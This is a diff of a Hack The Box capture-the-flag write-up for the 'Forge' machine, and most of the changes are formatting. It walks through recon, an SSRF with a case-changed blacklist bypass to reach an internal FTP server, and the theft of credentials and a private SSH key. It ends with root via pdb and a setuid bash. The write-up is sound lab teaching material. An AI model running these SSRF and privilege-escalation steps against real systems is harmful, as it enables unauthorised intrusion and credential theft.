@@ -1,16 +1,22 @@
 ---
 title: 'Hack The Box - Writeup'
-subtitle: 'Forge'
-author: 'c1sc0'
+subtitle: 'Machine: Forge'
+author: 'Author: c1sc0'
 date: \today{}
 documentclass: scrartcl
-mainfont: Fira Code
-sansfont: Fira Code
-code-block-font-site: \scriptize
+caption-justification: centering
+mainfont: Source Code Pro
+mainfontoptions:
+- BoldFont=Source Code Pro Bold
+- ItalicFont=Source Code Pro Italic
+sansfont: Open Sans
+monofont: Fira Code
+code-block-font-site: \scriptsize
 titlepage: true
 titlepage-text-color: "FFFFFF"
-titlepage-color: "0c0d0e"
-titlepage-rule-color: "8ac53e"
+titlepage-rule-color: "9fef00"
+titlepage-rule-height: 6
+titlepage-background: "/home/patrick/htb/report/forge/assets/htbback.pdf"
 logo: "/home/patrick/htb/report/forge/assets/badge.png"
 logo-width: 250pt
 header-left: 'Forge'
@@ -26,20 +32,20 @@ footer-right: 'Page \thepage'
 <!--- Latex foo for table of content ends-->
 
 # Overview
-| IP | Difficulty |
-| --- | --- |
-| 10.10.11.111 | Medium |
+| Name | IP | Difficulty |
+| --- | --- | --- |
+| Forge | 10.10.11.111 | Medium |
 
 # Recon
 
 ## Nmap
-`sudo nmap -sC -sV -oA nmap/forge -vvv 10.10.11.111`
+_sudo nmap -sC -sV -oA nmap/forge -vvv 10.10.11.111_
 
-```bash
+```{.bash caption="nmap results" style=mystyle}
 PORT   STATE    SERVICE REASON         VERSION
 21/tcp filtered ftp     no-response
 22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQA...
 |   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
@@ -49,13 +55,13 @@ PORT   STATE    SERVICE REASON         VERSION
 80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
 |_http-title: Did not follow redirect to http://forge.htb
 |_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## /etc/hosts
-80 redirects to `forge.htb`. So adding it to `/etc/hosts`
+80 redirects to _forge.htb_. So adding it to _/etc/hosts_
 
 ![added forge.htb to /etc/hosts](etc_hosts.png)
 
@@ -72,9 +78,9 @@ Uploading images works, whereas uploading a cmd shell for example doesn't.
 
 If you try and choose to upload from URL the box will callback to you:
 
-```bash
+```{.bash caption="connection test" style=mystyle}
 > sudo ncat -lnvp 80
-[sudo] password for patrick: 
+[sudo] password for patrick:
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::80
 Ncat: Listening on 0.0.0.0:80
@@ -91,7 +97,7 @@ Connection: keep-alive
 ## Subdomain enumeration
 Wfuzz will reveal another subdomain:
 
-```bash
+```{.bash caption="wfuzz vhost enumeration" style=mystyle}
 > wfuzz -c -w ~/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://forge.htb' -H "Host: FUZZ.forge.htb" --hw 26
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -101,10 +107,10 @@ Target: http://forge.htb/
 Total requests: 4989
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                      
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
-000000024:   200        1 L      4 W        27 Ch       "admin"                                                                                      
+000000024:   200        1 L      4 W        27 Ch       "admin"
 
 Total time: 0
 Processed Requests: 4989
@@ -112,24 +118,24 @@ Filtered Requests: 4988
 Requests/sec.: 0
 ```
 
-So adding it to `/etc/hosts` and again look at the resulting page.
+So adding it to _/etc/hosts_ and again look at the resulting page.
 
 ## admin.forge.htb
 ![Only localhost is allowed](localhost_only.png)
 
-So the idea is to leverage a vulnerablity at the upload from URL part to look at `admin.forge.htb` from within the internal network.
+So the idea is to leverage a vulnerablity at the upload from URL part to look at _admin.forge.htb_ from within the internal network.
 
 ![Blacklist is in place](blacklist.png)
 
 It looks like it is blacklisted though.
 
-Using `Admin.Forge.htb` though works quite well, but then it results in a display error:
+Using _Admin.Forge.htb_ though works quite well, but then it results in a display error:
 
 ![Image renderer does not render the page](display_error.png)
 
 Looking at this request in Burp reveals other paths we can look at:
 
-```curl
+```{.html caption="paths leaking" style=mystyle}
 <!DOCTYPE html>
 <html>
 <head>
@@ -152,22 +158,22 @@ Looking at this request in Burp reveals other paths we can look at:
 ```
 
 ## ftp
-Looking at `/annoucments` with the above technique we reveal credentials:
+Looking at _/annoucments_ with the above technique we reveal credentials:
 
-```bash
+```{.html caption="credentials in announcments" style=mystyle}
 <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
 <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
 <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
 ```
 
-Credentials are: `user:heightofsecurity123!`
+Credentials are: _user:heightofsecurity123!_
 
 # Foothold
 
 ## user.txt
-If you misuse the upload url function of `forge.htb` like this:
+If you misuse the upload url function of _forge.htb_ like this:
 
-```
+```{.bash caption="POST request" style=mystyle}
 POST /upload HTTP/1.1
 Host: forge.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -184,11 +190,11 @@ Upgrade-Insecure-Requests: 1
 url=http%3A%2F%2FAdmin.Forge.htb%2Fupload%3fu%3dftp%3a%2F%2Fuser:heightofsecurity123!%40Admin.Forge.htb&remote=1
 ```
 
-> url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb&remote=1
+_http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb_
 
 You can see the content of the internal bound ftp server:
 
-```
+```{.bash caption="server response" style=mystyle}
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:17:13 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -205,10 +211,10 @@ drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
 
 Now one could send this:
 
-> url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/user.txt&remote=1
+_http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/user.txt_
 
-And then read the `user.txt` flag.
-```bash
+And then read the _user.txt_ flag.
+```{.bash caption="user.txt in server response" style=mystyle}
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:19:50 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -222,12 +228,12 @@ Content-Type: image/jpg
 812765a195ec9d2bb2f47128019b176a
 ```
 
-user.txt: `812765a195ec9d2bb2f47128019b176a`
+user.txt: _812765a195ec9d2bb2f47128019b176a_
 
 ## Init Foothold
-So as we are a ftp user called `user` in a home directory we could also try ssh in with the creds:
+So as we are a ftp user called _user_ in a home directory we could also try ssh in with the creds:
 
-```bash
+```{.bash caption="trying ssh connection" style=mystyle}
 > ssh user@forge.htb
 The authenticity of host 'forge.htb (10.10.11.111)' can't be established.
 ED25519 key fingerprint is SHA256:ezqn5XF0Y3fAiyCDw46VNabU1GKFK0kgYALpeaUmr+o.
@@ -239,9 +245,9 @@ user@forge.htb: Permission denied (publickey).
 
 As we can see from the listing only pubkey is allowed. So, hidden folders will not be displayed in listing. But we get lucky and can retrieve the private key of user by the above hack with this url:
 
-> url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/.ssh/id_rsa&remote=1
+_http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/.ssh/id_rsa_
 
-```bash
+```{.bash caption="private key of user in server response" style=mystyle}
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:27:40 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -292,9 +298,9 @@ shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Now we can use the key to ssh in as `user`.
+Now we can use the key to ssh in as _user_.
 
-```bash
+```{.bash caption="ssh session on box" style=mystyle}
 > vim id_rsa
 > chmod 600 id_rsa
 > ssh -i id_rsa user@forge.htb
@@ -323,13 +329,13 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
-user@forge:~$ 
+user@forge:~$
 ```
 
 # Privilege escalation
-`sudo -l` will reveal the path
+_sudo -l_ will reveal the path
 
-```bash
+```{.bash caption="output of _sudo -l_" style=mystyle}
 user@forge:~$ sudo -l
 Matching Defaults entries for user on forge:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -340,7 +346,7 @@ User user may run the following commands on forge:
 
 First of all we look at the script itself.
 **/opt/remote-manage.py**
-```python
+```{.python caption="script we can run as root" style=mystyle}
 #!/usr/bin/env python3
 import socket
 import random
@@ -384,22 +390,22 @@ finally:
     quit()
 ```
 
-As can be seen from the code above, if you choose `a` from the menu for example there is not else statement for the variable `options`. Therefore you will trigger `pdb.post_mortem`, which will give you an interactive gdb shell and run python commands.
+As can be seen from the code above, if you choose _a_ from the menu for example there is not else statement for the variable _options_. Therefore you will trigger _pdb.post_mortem_, which will give you an interactive gdb shell and run python commands.
 
 So in the first ssh session we start the script like:
 
-```bash
-user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py 
+```{.bash caption="ssh session 1 - start server" style=mystyle}
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
 Listening on localhost:5959
 ```
 
-In a second session we trigger the bug connecting to the socket and chose `a` from the menu:
-```bash
+In a second session we trigger the bug connecting to the socket and chose _a_ from the menu:
+```{.bash caption="ssh session 2 - connect to server" style=mystyle}
 user@forge:~$ nc localhost 5959
 Enter the secret passsword: secretadminpassword
 Welcome admin!
 
-What do you wanna do: 
+What do you wanna do:
 [1] View processes
 [2] View free memory
 [3] View listening sockets
@@ -411,7 +417,7 @@ The admin password to connect can be seen from the code above.
 
 After triggering we can look at our first session and have an interactive shell there.
 
-```bash
+```{.bash caption="ssh session 1 - gdb shell" style=mystyle}
 invalid literal for int() with base 10: b'a'
 > /opt/remote-manage.py(27)<module>()
 -> option = int(clientsock.recv(1024).strip())
@@ -426,16 +432,16 @@ uid=0(root) gid=0(root) groups=0(root)
 (Pdb) exit
 ```
 
-I chose to setuid modify `/bin/bash` to gain an interactive shell afterwards.
+I chose to setuid modify _/bin/bash_ to gain an interactive shell afterwards.
 
-```bash
+```{.bash caption="grabbing root.txt" style=mystyle}
 user@forge:~$ /bin/bash -p
 bash-5.0# id
 uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
 bash-5.0# cd /root
-bash-5.0# cat root.txt 
+bash-5.0# cat root.txt
 ae37345dd6a5cf9001c7668496ab77c3
-bash-5.0# 
+bash-5.0#
 ```
 
-That's it. Box rooted - root.txt `ae37345dd6a5cf9001c7668496ab77c3`
+That's it. Box rooted - root.txt _ae37345dd6a5cf9001c7668496ab77c3_
